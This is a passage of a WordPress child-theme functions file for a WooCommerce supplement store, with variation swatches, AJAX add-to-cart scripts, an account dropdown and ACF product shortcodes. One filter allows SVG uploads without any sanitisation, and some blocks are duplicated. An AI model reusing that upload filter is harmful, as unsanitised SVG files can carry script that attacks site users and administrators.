<?php

function child_enqueue_styles()
{
    $parent_handle = 'astra-theme-css';

    wp_enqueue_style(
        'kaya-puressence-theme-css',
        get_stylesheet_directory_uri() . '/style.css',
        array($parent_handle),
        null,
        'all'
    );
}
add_action('wp_enqueue_scripts', 'child_enqueue_styles', 15);

function kaya_dynamic_variation_swatches()
{
    global $product;

    if (!$product) return '<p>No product found.</p>';
    if (!$product->is_type('variable')) return '<p>No variations available for this product.</p>';
   $qty = woocommerce_quantity_input(array(
        'min_value'   => 1,
        'max_value'   => $product->get_max_purchase_quantity(),
        'input_value' => 1,
    ), $product, false);
    $variations = $product->get_available_variations();
    if (empty($variations) || empty($variations[0]['attributes'])) {
        return '<p>No variations available for this product.</p>';
    }

    $unionAttrKeys = [];
    foreach ($variations as $v) {
        foreach (array_keys($v['attributes'] ?? []) as $k) {
            $unionAttrKeys[$k] = true;
        }
    }
    $attr_keys = array_keys($unionAttrKeys);

    $size_key = null;
    $package_key = null;

    foreach ($attr_keys as $k) {
        $kl = strtolower($k);
        if (strpos($kl, 'choose-your-size') !== false || preg_match('~(^|[_-])size($|[_-])~', $kl)) {
            $size_key = $k;
        }
        if (strpos($kl, 'choose-your-package') !== false || strpos($kl, 'package') !== false || strpos($kl, 'pack') !== false) {
            $package_key = $k;
        }
    }

    if (!$size_key && !$package_key && count($attr_keys) === 1) {
        $only = $attr_keys[0];
        $ol = strtolower($only);
        if (strpos($ol, 'size') !== false) $size_key = $only;
        elseif (strpos($ol, 'package') !== false || strpos($ol, 'pack') !== false) $package_key = $only;
        else $package_key = $only;
    }

    $sizes    = [];
    $packages = [];
    foreach ($variations as $v) {
        $a = $v['attributes'] ?? [];
        if ($size_key && !empty($a[$size_key])) {
            $sizes[$a[$size_key]][] = $v;
        }
        if ($package_key && !empty($a[$package_key])) {
            $packages[$a[$package_key]][] = $v;
        }
    }

    if ($size_key && empty($sizes)) $size_key = null;
    if ($package_key && empty($packages)) $package_key = null;

    $currency_symbol = get_woocommerce_currency_symbol();
    $currency_pos    = get_option('woocommerce_currency_pos', 'left');

    $human = function ($slug) {
        $t = str_replace(['-', '_'], ' ', (string) $slug);
        return ucfirst(trim($t));
    };

    ob_start(); ?>
    <form class="kaya-variation-form variations_form cart" method="post"
        data-product_id="<?php echo esc_attr($product->get_id()); ?>"
       data-size-key="<?php echo esc_attr($size_key ? preg_replace('/^attribute_/', '', $size_key) : ''); ?>"
       data-package-key="<?php echo esc_attr($package_key ? preg_replace('/^attribute_/', '', $package_key) : ''); ?>"

        data-currency-symbol="<?php echo esc_attr($currency_symbol); ?>"
        data-currency-pos="<?php echo esc_attr($currency_pos); ?>"
        data-product_variations="<?php echo esc_attr(wp_json_encode($variations)); ?>">

        <?php if ($size_key): ?>
            <h3>Choose Your Size</h3>
            <div class="size-options">
                <?php foreach ($sizes as $size_slug => $vars):
                    $v1    = reset($vars);
                    $price = wc_price($v1['display_price']);
                    $reg   = ($v1['display_regular_price'] > $v1['display_price']) ? wc_price($v1['display_regular_price']) : '';
                ?>
                    <div class="size-card"
                        data-attr="<?php echo esc_attr(preg_replace('/^attribute_/', '', $size_key)); ?>"
                        data-value="<?php echo esc_attr($size_slug); ?>"
                        data-label="<?php echo esc_attr($human($size_slug)); ?>">
                        <p class="title"><?php echo esc_html($human($size_slug)); ?></p>
                        <p class="subtitle">
                            <?php if (stripos($size_slug, 'small') !== false): ?>
                                <span class="gummies">30 Gummies</span><br>
                                <span class="days">(30 days)</span>
                            <?php else: ?>
                                <span class="gummies">60 Gummies</span><br>
                                <span class="days">(60 days)</span>
                            <?php endif; ?>
                        </p>
                        <p class="price">
                            <span class="cur"><?php echo $price; ?></span>
                            <?php if ($reg): ?><span class="old"><?php echo $reg; ?></span><?php endif; ?>
                        </p>
                    </div>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>

        <?php if ($package_key): ?>
            <h3>Choose Your Package</h3>
            <div class="package-options">
                <?php foreach ($packages as $pack_slug => $vars):
                    $v1        = reset($vars);
                    $p         = $v1['display_price'];
                    $r         = $v1['display_regular_price'];
                    $price     = wc_price($p);
                    $reg       = $r > $p ? wc_price($r) : '';
                    $discount  = $r > $p ? round((($r - $p) / $r) * 100) : 0;
                ?>
                    <div class="package-card"
                        data-attr="<?php echo esc_attr(preg_replace('/^attribute_/', '', $package_key)); ?>"
                        data-value="<?php echo esc_attr($pack_slug); ?>"
                        data-label="<?php echo esc_attr($human($pack_slug)); ?>">
                        <p class="title"><?php echo esc_html($human($pack_slug)); ?></p>
                        <p class="price">
                            <span class="cur"><?php echo $price; ?></span>
                            <?php if ($reg): ?><span class="old"><?php echo $reg; ?></span><?php endif; ?>
                            <?php if ($discount): ?><span class="discount"><?php echo $discount; ?>% OFF</span><?php endif; ?>
                        </p>
                    </div>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>

<div class="quantity">

    <button type="button" class="minus">−</button>

    <input
        type="number"
        id="quantity_<?php echo esc_attr($product->get_id()); ?>"
        class="input-text qty text"
        name="quantity"
        value="1"
        min="1"
        max="<?php echo esc_attr($product->get_max_purchase_quantity()); ?>"
        step="1"
        inputmode="numeric"
    />

    <button type="button" class="plus">+</button>

</div>

        <button type="button" class="single_add_to_cart_button button alt" disabled>
            Add to Cart — <span class="dynamic-price"><?php echo wc_price($product->get_price()); ?></span>
        </button>

        <input type="hidden" name="variation_id" class="variation_id" value="">
        <input type="hidden" name="product_id" class="product_id" value="<?php echo esc_attr($product->get_id()); ?>">
        <input type="hidden" name="add-to-cart" class="add_to_cart" value="<?php echo esc_attr($product->get_id()); ?>">

        <?php if ($size_key): ?>
    <input type="hidden" class="attr-field" name="attribute_<?php echo esc_attr(preg_replace('/^attribute_/', '', $size_key)); ?>" value="">
<?php endif; ?>
<?php if ($package_key): ?>
    <input type="hidden" class="attr-field" name="attribute_<?php echo esc_attr(preg_replace('/^attribute_/', '', $package_key)); ?>" value="">
<?php endif; ?>

        

    </form>

   <script>
        jQuery(function($) {
            console.log('qty form');
            var $form = $('.kaya-variation-form');
            if (!$form.length) return;

            function decodeHtml(s) {
                return $('<textarea/>').html(s || '').text();
            }

            var variations = [];
            try {
                variations = JSON.parse(decodeHtml($form.attr('data-product_variations') || '[]')) || [];
            } catch (e) {
                console.error('[KAYA JS] JSON parse error:', e);
            }

            var sizeKey = ($form.attr('data-size-key') || '').trim() || null;
            var packageKey = ($form.attr('data-package-key') || '').trim() || null;
            var attrSizeKey = sizeKey ? 'attribute_' + sizeKey : null;
            var attrPackageKey = packageKey ? 'attribute_' + packageKey : null;

            var hasSize = !!sizeKey;
            var hasPackage = !!packageKey;

            function getVal(name) {
                return name ? $form.find('input[name="' + name + '"]').val() : '';
            }

            function setVal(name, v) {
                if (name) $form.find('input[name="' + name + '"]').val(v || '');
            }

            function pretty(s) {
                return String(s || '').toLowerCase().replace(/-/g, ' ').trim();
            }

            // Find a variation based on whichever keys exist
            function findVariation(sizeVal, packVal) {
                var ns = pretty(sizeVal),
                    np = pretty(packVal);
                for (var i = 0; i < variations.length; i++) {
                    var a = variations[i].attributes || {};
                    // var jsSize = pretty(a[sizeKey] || '');
                    // var jsPack = pretty(a[packageKey] || '');
                    var jsSize = pretty(a[sizeKey] || a['attribute_' + sizeKey] || '');
                    var jsPack = pretty(a[packageKey] || a['attribute_' + packageKey] || '');
                    if (hasSize && hasPackage && ns === jsSize && np === jsPack) return variations[i];
                    if (!hasSize && np === jsPack) return variations[i];
                    if (!hasPackage && ns === jsSize) return variations[i];
                }
                return null;
            }

            function formatMoney(n) {
                var sym = $form.attr('data-currency-symbol') || '',
                    pos = $form.attr('data-currency-pos') || 'left';
                var num = (Number(n || 0)).toFixed(2);
                var parts = num.split('.');
                parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                n = parts[0];
                if (pos === 'left_space') return sym + ' ' + n;
                if (pos === 'right') return n + sym;
                if (pos === 'right_space') return n + ' ' + sym;
                return sym + n;
            }

            function priceParts(v) {
                if (!v) return null;
                var p = (typeof v.display_price !== 'undefined') ? v.display_price : null;
                var r = (typeof v.display_regular_price !== 'undefined') ? v.display_regular_price : null;
                var out = {
                    cur: null,
                    old: null,
                    discount: 0
                };
                if (p !== null) out.cur = formatMoney(p);
                if (r !== null && r > p) {
                    out.old = formatMoney(r);
                    out.discount = Math.round(((r - p) / r) * 100);
                }
                return out;
            }

            function renderPriceInto($priceEl, parts) {
                if (!$priceEl || !parts) return;
                var $cur = $priceEl.find('.cur');
                var $old = $priceEl.find('.old');
                var $disc = $priceEl.find('.discount');

                if (!$cur.length) {
                    $priceEl.empty().append('<span class="cur"></span> <span class="old" style="display:none"></span> <span class="discount" style="display:none"></span>');
                    $cur = $priceEl.find('.cur');
                    $old = $priceEl.find('.old');
                    $disc = $priceEl.find('.discount');
                }
                $cur.text(parts.cur || '');
                if (parts.old) {
                    $old.text(parts.old).show();
                } else {
                    $old.text('').hide();
                }
                if (parts.discount > 0) {
                    $disc.text(parts.discount + '% OFF').show();
                } else {
                    $disc.text('').hide();
                }
            }

            function refreshAllPackagePricesForSize() {
                if (!(hasSize && hasPackage)) return;
                var sizeVal = getVal(attrSizeKey);
                if (!sizeVal) return;
                $form.find('.package-card').each(function() {
                    var $card = $(this);
                    var packVal = $card.data('value');
                    var v = findVariation(sizeVal, packVal);
                    renderPriceInto($card.find('.price'), priceParts(v) || {
                        cur: '',
                        old: '',
                        discount: 0
                    });
                });
            }

            function updateAddToCartPreview(v) {
                if (!v) return;
                var dp = (typeof v.display_price !== 'undefined') ? v.display_price : null;
                var qty = parseInt($form.find('input.qty').val(), 10) || 1;
                if (dp !== null) $form.find('.dynamic-price').text(formatMoney(dp * qty));
            }

            function updateState() {
                var sizeVal = getVal(attrSizeKey);
                var packVal = getVal(attrPackageKey);
                var v = findVariation(sizeVal, packVal);
                var $btn = $form.find('.single_add_to_cart_button');

                refreshAllPackagePricesForSize();

                if (v) {
                   
                    $form.find('.variation_id').val(v.variation_id);
                    $btn.prop('disabled', false);
                    updateAddToCartPreview(v);

                    if (hasPackage) {
                        var $activePack = $form.find('.package-card.active');
                        if ($activePack.length) {
                            renderPriceInto($activePack.find('.price'), priceParts(v) || {});
                        }
                    }
                    setTimeout(function() {
        if (typeof refreshCommas === 'function') refreshCommas();
    }, 200);
                    return;
                }
                $form.find('.variation_id').val('');
                $btn.prop('disabled', true);
            }

            // Card interactions
            $form.on('click', '.size-card, .package-card', function() {
                var $c = $(this);
                var attrKey = $c.data('attr'); // original key
                var valSlug = $c.data('value');
                // write to attribute_* hidden field
                if (attrKey === sizeKey) setVal(attrSizeKey, valSlug);
                if (attrKey === packageKey) setVal(attrPackageKey, valSlug);

                $c.addClass('active').siblings('[data-attr="' + attrKey + '"]').removeClass('active');
              //  updateState();
               updateState();

            });

            // Initial selections
            if (hasSize && $form.find('.size-card').length) {
                $form.find('.size-card').first().trigger('click');
            }
            if (hasPackage && $form.find('.package-card').length) {
                $form.find('.package-card').first().trigger('click');
            }
            if ((!hasSize && hasPackage) || (hasSize && !hasPackage)) {
                // single dimension – still compute
               // updateState();
               updateState();

            }

            // Qty
            $form.on('input change', 'input.qty', function() {
                var v = findVariation(getVal(attrSizeKey), getVal(attrPackageKey));
                if (v) updateAddToCartPreview(v);
            });

            // AJAX Add to Cart (uses Woo's endpoint & fragment flow)
            $form.on('click', '.single_add_to_cart_button', function(e) {
                e.preventDefault();
                var variation_id = $form.find('input.variation_id').val();
                if (!variation_id) {
                    alert('Please select available options');
                    return;
                }

                var payload = {};
                $form.serialize().split('&').forEach(function(p) {
                    var kv = p.split('=');
                    payload[decodeURIComponent(kv[0])] = decodeURIComponent(kv[1] || '');
                });

                var ajaxUrl = (window.wc_cart_fragments_params && window.wc_cart_fragments_params.wc_ajax_url) ?
                    window.wc_cart_fragments_params.wc_ajax_url.toString().replace('%%endpoint%%', 'add_to_cart') :
                    '?wc-ajax=add_to_cart';

                $.ajax({
                        type: 'POST',
                        url: ajaxUrl,
                        data: payload,
                        dataType: 'json'
                    })
                    .done(function(res) {
                        if (res && res.fragments) {
                            $(document.body).trigger('added_to_cart', [res.fragments, res.cart_hash, null]);
                        } else {
                            $(document.body).trigger('wc_fragment_refresh');
                        }
                        // Open your mini cart drawer if present
                        $('body').addClass('kaya-minicart-open');
                        $('.kaya-minicart, #kaya-minicart-overlay').addClass('is-open').attr('aria-hidden', 'false');

                         sendCartRequest({
                            action: 'woocommerce_get_refreshed_fragments'
                        });
                    })
                    .fail(function(xhr) {
                        console.error('Add to cart error', xhr && xhr.responseText);
                        alert('Something went wrong. Please try again.');
                    });
            });
        });
    </script> 
<?php
    return ob_get_clean();
}
add_shortcode('variation_swatches_dynamic', 'kaya_dynamic_variation_swatches');

// Enable SVG upload
function allow_svg_uploads($mimes)
{
    $mimes['svg']  = 'image/svg+xml';
    $mimes['svgz'] = 'image/svg+xml';
    return $mimes;
}
add_filter('upload_mimes', 'allow_svg_uploads');

// Add +/- buttons to WooCommerce quantity fields
add_action('wp_footer', function () {
    if (!is_product()) return;
?>

<?php
});
function custom_woocommerce_review_box_shortcode($atts)
{
    if (!is_product()) return '';
    global $product;
    ob_start();
    comments_template();
    return ob_get_clean();
}
add_shortcode('woo_review_box', 'custom_woocommerce_review_box_shortcode');
add_action('wp_footer', function () {
    if (!class_exists('WooCommerce')) return;
?>
    <script type="text/javascript">
        jQuery(function($) {

            $(document).on('click', 'a[href*="?add-to-cart="]', function(e) {
                e.preventDefault();

                var $btn = $(this);
                var url = $btn.attr('href');
                var match = url ? url.match(/add-to-cart=(\d+)/) : null;
                var variation_id = match ? match[1] : null;

                if (!variation_id) {
                    console.warn('[KAYA JS] No variation ID found.');
                    return;
                }

                var ajaxUrl = (window.wc_cart_fragments_params && window.wc_cart_fragments_params.wc_ajax_url) ?
                    window.wc_cart_fragments_params.wc_ajax_url.toString().replace('%%endpoint%%', 'add_to_cart') :
                    '?wc-ajax=add_to_cart';

                $.ajax({
                        type: 'POST',
                        url: ajaxUrl,
                        data: {
                            variation_id: variation_id,
                            product_id: variation_id,
                            quantity: 1
                        },
                        dataType: 'json',
                        beforeSend: function() {
                            $btn.addClass('loading');
                        }
                    })
                    .done(function(res) {
                        $btn.removeClass('loading');

                        if (typeof sendCartRequest === 'function') {
                            sendCartRequest({
                                action: 'woocommerce_get_refreshed_fragments'
                            });
                        } else {
                            $(document.body).trigger('wc_fragment_refresh');
                        }

                        $('body').addClass('kaya-minicart-open');
                        $('.kaya-minicart, #kaya-minicart-overlay')
                            .addClass('is-open')
                            .attr('aria-hidden', 'false');
                    })
                    .fail(function(xhr) {
                        $btn.removeClass('loading');
                        console.error('[KAYA JS] Add-to-Cart Error:', xhr && xhr.responseText);
                        alert('Something went wrong. Please try again.');
                    });
            });

        });
    </script>
<?php
});
add_filter('woocommerce_package_rates', function ($rates, $package) {
    $free_rates = [];

    foreach ($rates as $rate_id => $rate) {
        if (!empty($rate->method_id) && $rate->method_id === 'free_shipping') {
            $free_rates[$rate_id] = $rate;
        }
    }

    if (!empty($free_rates)) {
        return $free_rates;
    }

    return $rates;
}, 10, 2);

add_action('wp_footer', function () { ?>
    <script>
        jQuery(function($) {

            // --- Format helper ---
            function addCommasToNumber(numStr) {
                numStr = String(numStr || '').replace(/,/g, '');
                const parts = numStr.split('.');
                parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                // Remove decimals if it's exactly ".00"
                return parts[1] && parts[1] !== '00' ? parts[0] + '.' + parts[1] : parts[0];
            }

            function formatPriceText(text) {
                if (!text || !/\d/.test(text)) return text;
                const match = text.match(/^(\D*\s?)([\d.,]+)(.*)$/);
                if (!match) return text;
                const prefix = match[1] || '';
                const number = match[2].replace(/,/g, '');
                const suffix = match[3] || '';
                return prefix + addCommasToNumber(number) + suffix;
            }

            function applyCommasToPrices($scope) {
                $scope.find('.price .cur, .price .old, .dynamic-price').each(function() {
                    const $el = $(this);
                    const current = $el.text().trim();
                    if (!current.match(/\d/)) return;
                    if (current.includes(',')) return; // already formatted
                    const formatted = formatPriceText(current);
                    $el.text(formatted);
                });
            }

            function refreshCommas() {
                const $form = $('.kaya-variation-form');
                if ($form.length) applyCommasToPrices($form);
            }

            // --- Initial run ---
            refreshCommas();

            // --- Reapply commas after Woo or tab interactions ---
            $(document)
                // .on('click', '.size-card, .package-card', function() {
                //     setTimeout(refreshCommas, 150);
                // })
                .on('input change', 'input.qty', function() {
                    setTimeout(refreshCommas, 150);
                });

            // WooCommerce triggers when variations update
            $(document.body).on('updated_checkout updated_cart_totals wc_fragments_refreshed found_variation added_to_cart', function() {
                setTimeout(refreshCommas, 150);
            });

            // --- Observe DOM changes (for tab refreshes replacing elements) ---
            // --- Observe DOM changes (for tab refreshes replacing elements) ---
const target = document.querySelector('.kaya-variation-form');
if (target) {
    let commaTimer = null;
    const observer = new MutationObserver(() => {
        clearTimeout(commaTimer);
        commaTimer = setTimeout(function() {
            observer.disconnect();
            refreshCommas();
            observer.observe(target, { childList: true, subtree: true });
        }, 300);
    });
    observer.observe(target, {
        childList: true,
        subtree: true
    });
}
        });
    </script>
    <?php });
add_action('wp_footer', function () {
    if (is_cart() || is_checkout() || is_product()) : ?>
   <script>
jQuery(function($) {

    var $form = $('.kaya-variation-form');
    if (!$form.length) return;

    function addQuantityButtons() {
        $form.find('.quantity').each(function() {
            var $this = $(this);

            if ($this.data('qty-init')) return;

            $this.data('qty-init', true);

            $this.prepend('<button type="button" class="minus">−</button>');
            $this.append('<button type="button" class="plus">+</button>');
        });
    }

    // Run ONLY once
   // addQuantityButtons();

    // Increase quantity
   $form.on('click', '.plus', function(e) {
    e.stopImmediatePropagation();
    var $input = $(this).siblings('input.qty');
    if (!$input.length) return;
    var val = parseFloat($input.val()) || 0;
    var max = parseFloat($input.attr('max'));
    if (!max || max < 0 || val < max) {
        $input.val(val + 1).trigger('change');
    }
});

$form.on('click', '.minus', function(e) {
    e.stopImmediatePropagation();
    var $input = $(this).siblings('input.qty');
    if (!$input.length) return;
    var val = parseFloat($input.val()) || 0;
    var min = parseFloat($input.attr('min')) || 1;
    if (val > min) {
        $input.val(val - 1).trigger('change');
    }
});

});
</script>
    <?php endif;
});

add_filter('woocommerce_add_error', function($error) {
    if (strpos($error, 'Please choose product options') !== false) {
        return ''; 
    }
    return $error;
});
add_filter('wc_add_to_cart_message_html', '__return_empty_string');
add_filter('wc_add_to_cart_message', '__return_false');
add_shortcode('account_dropdown', function () {

    $icon_url = '/wp-content/uploads/2025/11/svgviewer-output.svg';

    if ( is_user_logged_in() ) {

        return '
        <div class="kp-acc-wrapper">
            <button class="kp-acc-icon" type="button">
                <img src="'.$icon_url.'" alt="Account" class="kp-acc-user-icon" />
            </button>

            <div class="kp-acc-dropdown">
                <div class="kp-acc-header">
                    <div class="kp-acc-title"><a href="/my-account/">My Account</a></div>
                </div>

                <div class="kp-acc-list">

                    <a href="/my-account/orders" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/svgviewer-output-1.svg" class="kp-acc-menu-icon" alt="">
                        <span>Orders</span>
                    </a>

                    <a href="/my-account/edit-account" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/svgviewer-output-1-1.svg" class="kp-acc-menu-icon" alt="">
                        <span>Account Details</span>
                    </a>

                    <a href="/my-account/edit-account/#password" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/svgviewer-output-2.svg" class="kp-acc-menu-icon" alt="">
                        <span>Update Password</span>
                    </a>
					
					<a href="/my-account/lost-password/?" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/Forget-pass.svg" class="kp-acc-menu-icon" alt="">
                        <span>Lost Password</span>
                    </a>

                    <!-- Logout button with redirection to My Account page -->
                    <a href="'.wp_logout_url( get_permalink( wc_get_page_id( 'myaccount' ) ) ).'" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/logout-icon.svg" class="kp-acc-menu-icon" alt="">
                        <span>Logout</span>
                    </a>

                </div>
            </div>
        </div>';

    } else {

        // If the user is not logged in, show a Login option (optional)
        return '
        <div class="kp-acc-wrapper">
            <button class="kp-acc-icon" type="button">
                <img src="'.$icon_url.'" alt="Account" class="kp-acc-user-icon" />
            </button>

            <div class="kp-acc-dropdown">
                <div class="kp-acc-header">
                    <div class="kp-acc-title">Login</div>
                </div>

                <div class="kp-acc-list">

                    <a href="/my-account/" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/login.svg" class="kp-acc-menu-icon" alt="">
                        <span>My Account</span>
                    </a>

                </div>
            </div>
        </div>';
    }
});

add_action('wp_head', function () { ?>
        <style>
            body.woocommerce-checkout.logged-in #contact-fields #email {
                pointer-events: none !important;
            }
			.credit-card{
				margin-top: -26px !important;
				margin-bottom: 40px !important;
			}
			body.woocommerce-checkout .wc-block-components-checkout-return-to-cart-button{
			    color: #161616 !important;
				background: transparent !important;
				background-color: transparent !important;
			}
			body.woocommerce-checkout .site-content{
				margin-bottom:40px;
			}
			body.woocommerce-checkout.logged-in #contact-fields #email{
				pointer-events: none !important;
    			background-color: transparent !important;
				padding:0 !important;
			}
			@media (max-width: 768px) {
				.credit-card{
					margin-top: 30px !important;
        			margin-bottom: 10px !important;
				}
			}
        </style>
<?php 
});
add_filter('wc_add_to_cart_message_html', '__return_empty_string');
add_filter('wc_add_to_cart_message', '__return_false');
add_shortcode('account_dropdown', function () {

    $icon_url = '/wp-content/uploads/2025/11/svgviewer-output.svg';

    if ( is_user_logged_in() ) {

        return '
        <div class="kp-acc-wrapper">
            <button class="kp-acc-icon" type="button">
                <img src="'.$icon_url.'" alt="Account" class="kp-acc-user-icon" />
            </button>

            <div class="kp-acc-dropdown">
                <div class="kp-acc-header">
                    <div class="kp-acc-title"><a href="/my-account/">My Account</a></div>
                </div>

                <div class="kp-acc-list">

                    <a href="/my-account/orders" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/svgviewer-output-1.svg" class="kp-acc-menu-icon" alt="">
                        <span>Orders</span>
                    </a>

                    <a href="/my-account/edit-account" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/svgviewer-output-1-1.svg" class="kp-acc-menu-icon" alt="">
                        <span>Account Details</span>
                    </a>

                    <a href="/my-account/edit-account/#password" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/svgviewer-output-2.svg" class="kp-acc-menu-icon" alt="">
                        <span>Update Password</span>
                    </a>
					
					<a href="/my-account/lost-password/?" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/Forget-pass.svg" class="kp-acc-menu-icon" alt="">
                        <span>Lost Password</span>
                    </a>

                    <!-- Logout button with redirection to My Account page -->
                    <a href="'.wp_logout_url( get_permalink( wc_get_page_id( 'myaccount' ) ) ).'" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/logout-icon.svg" class="kp-acc-menu-icon" alt="">
                        <span>Logout</span>
                    </a>

                </div>
            </div>
        </div>';

    } else {

        // If the user is not logged in, show a Login option (optional)
        return '
        <div class="kp-acc-wrapper">
            <button class="kp-acc-icon" type="button">
                <img src="'.$icon_url.'" alt="Account" class="kp-acc-user-icon" />
            </button>

            <div class="kp-acc-dropdown">
                <div class="kp-acc-header">
                    <div class="kp-acc-title">Login</div>
                </div>

                <div class="kp-acc-list">

                    <a href="/my-account/" class="kp-acc-item">
                        <img src="/wp-content/uploads/2025/11/login.svg" class="kp-acc-menu-icon" alt="">
                        <span>My Account</span>
                    </a>

                </div>
            </div>
        </div>';
    }
});

add_action('wp_head', function () { ?>
<style>
 <style>
        .product-detail-price .k-qty {
            display: inline-flex;
            align-items: center;
            border: 1px solid #E5E7EB;
            border-radius: 12px;
            background: #fff;
            overflow: hidden;
        }

        .product-detail-price .k-qty input.qty {
            width: 64px;
            height: 44px;
            border: none;
            outline: none;
            text-align: center;
            font-size: 18px;
            font-weight: 600;
            background: transparent;
        }

        .product-detail-price .k-qty input.qty::-webkit-outer-spin-button,
        .product-detail-price .k-qty input.qty::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .product-detail-price .k-qty input.qty {
            -moz-appearance: textfield;
            appearance: textfield;
        }

        .product-detail-price .k-qty .btn {
            width: 44px;
            height: 44px;
            border: 0;
            background: #fff;
            font-size: 22px;
            font-weight: 300;
            cursor: pointer;
            transition: background .2s ease;
            color: #000;
        }	

/* Layout wrapper */
.kp-acc-wrapper {
    position: relative;
    display: inline-block;
}

/* Icon button */
.kp-acc-icon {
    border: 0;
    background: transparent;
    padding: 0;
    margin: 0;
    cursor: pointer;
}

.kp-acc-user-icon {
    width: 12px;
    height: 12px;
    display: block;
}

/* Dropdown panel */
.kp-acc-dropdown {
    position: absolute;
    top: 130%;
    right: 0;
    width: 260px;
    background: #ffffff;
    border-radius: 10px;
    padding: 12px 4px;
    box-shadow: 0 15px 40px rgba(0,0,0,0.12);
    opacity: 0;
    visibility: hidden;
    transform: translateY(10px);
    transition: all 0.32s ease;
    z-index: 99999;
}

/* Hover to open */
.kp-acc-wrapper:hover .kp-acc-dropdown {
    opacity: 1;
    visibility: visible;
    transform: translateY(0);
}
	.kp-acc-title a {
		color: #161616 !important
	}

/* Header */
.kp-acc-header {
    padding-bottom: 12px;
    margin-bottom: 12px;
    border-bottom: 1px solid #e6e6e6;
}

.kp-acc-title {
    font-size: 17px;
    font-weight: 600;
    color: #111;
	padding-left: 10px;
}

/* Menu items */
.kp-acc-list {
    display: flex;
    flex-direction: column;
    gap: 2px;
}

.kp-acc-item {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 6px 0;
    text-decoration: none;
    color: #111;
    font-size: 15px;
}

/* Menu icons */
.kp-acc-menu-icon {
    width: 20px;
    height: 20px;
    opacity: 0.85;
}

/* Hover state */
.kp-acc-item:hover {
    color: #0F214E;
}

</style>
<?php });
// Api code
add_filter( 'woocommerce_rest_prepare_product_object', function( $response, $object, $request ) {
    $data = $response->get_data();

    $allowed_keys = [
        'id',
        'name',
        'price',
        'sku',
        'short_description',
        'stock_quantity',
        'manage_stock',
        'in_stock',
        'type',
        'permalink',
        'images',
        'categories',
        'tags',
        'weight',
        'dimensions',
        'average_rating',
        'rating_count',
        'reviews',
        'attributes',
        'price_html',
        'on_sale',
        'sale_price',
        'regular_price',
        'date_on_sale_from',
        'date_on_sale_to',
        'total_sales',
        'parent_id',
    ];

    $filtered = array_intersect_key( $data, array_flip( $allowed_keys ) );

    if ( isset( $filtered['description'] ) ) {
        $filtered['description'] = wp_strip_all_tags( $filtered['description'] );
    }
    if ( isset( $filtered['short_description'] ) ) {
        $filtered['short_description'] = wp_strip_all_tags( $filtered['short_description'] );
    }

    $acf_fields = [
        'product_caption', 
        'benefits',
        'benefits_detailed',
        'ingredients',
        'nutrition_facts',
        'how_to_use',
    ];

    foreach ( $acf_fields as $acf_field ) {
        $acf_value = get_field( $acf_field, $object->get_id() ); 
        $filtered[ $acf_field ] = $acf_value; 
    }

    $response->set_data( $filtered );

    return $response;
}, 10, 3 );
// Create Shortcode: [product_benefits]
add_shortcode( 'product_benefits', 'display_product_key_benefits_shortcode' );

function display_product_key_benefits_shortcode() {
    // Start recording output
    ob_start();

    // 1. Check using the Repeater Name from your screenshot: 'benefits'
    if( have_rows('benefits') ):

        echo '<div class="custom-key-benefits">';
        echo '<h3>Key Benefits</h3>';
        echo '<ul>';

        // 2. Loop through rows
        while( have_rows('benefits') ) : the_row();
        
            // 3. Get the Sub Field Name from your screenshot: 'add_benefit'
            $text = get_sub_field('add_benefit');
            
            if( $text ) {
                echo '<li>' . esc_html( $text ) . '</li>';
            }
            
        endwhile;

        echo '</ul>';
        echo '</div>';

    endif;

    // Return the recorded output
    return ob_get_clean();
}
// Shortcode for Detailed Benefits
add_shortcode( 'product_benefits_detailed', 'display_detailed_benefits_shortcode' );

function display_detailed_benefits_shortcode() {
    ob_start();

    // Check using the Repeater Name: 'benefits_detailed'
    if( have_rows('benefits_detailed') ):

        echo '<div class="detailed-benefits-grid">';

        while( have_rows('benefits_detailed') ) : the_row();
            
            // Get Sub Fields
            $title = get_sub_field('benefit_title');
            $desc = get_sub_field('benefit_description');

            echo '<div class="benefit-item">';
            
            if( $title ) {
                echo '<h4>' . esc_html( $title ) . '</h4>';
            }
            
            if( $desc ) {
                echo '<p>' . esc_html( $desc ) . '</p>';
            }

            echo '</div>';

        endwhile;

        echo '</div>';

    endif;

    return ob_get_clean();
}

// Shortcode for Ingredients List with Quantity
add_shortcode( 'product_ingredients_list', 'display_ingredients_list_shortcode' );

function display_ingredients_list_shortcode() {
    ob_start();

    // Check if the repeater 'ingredients' has data
    if( have_rows('ingredients') ):

        echo '<div class="ingredients-list-grid">';

        while( have_rows('ingredients') ) : the_row();
            
            // Get the sub-fields exactly as named in your screenshot
            $title = get_sub_field('ingredient_title');
            $desc = get_sub_field('ingredient_description');
            $qty = get_sub_field('ingredient_quantity'); 

            echo '<div class="ingredient-card">';
            
                // Left Side: Title & Description
                echo '<div class="ingredient-content">';
                    if( $title ) echo '<h4>' . esc_html( $title ) . '</h4>';
                    if( $desc ) echo '<p>' . esc_html( $desc ) . '</p>';
                echo '</div>';

                // Right Side: Quantity Badge
                if( $qty ) {
                    echo '<div class="ingredient-badge">' . esc_html( $qty ) . '</div>';
                }

            echo '</div>';

        endwhile;

        echo '</div>';

    endif;

    return ob_get_clean();
}
add_shortcode( 'product_nutrition_facts', 'display_nutrition_facts_shortcode' );

function display_nutrition_facts_shortcode() {
    ob_start();

    if( have_rows('nutrition_facts') ):

        echo '<div class="nutrition-facts-list">';

        while( have_rows('nutrition_facts') ) : the_row();
            
            $label = get_sub_field('label');
            $value = get_sub_field('value');

            echo '<div class="nutrition-row">';
            
                if( $label ) {
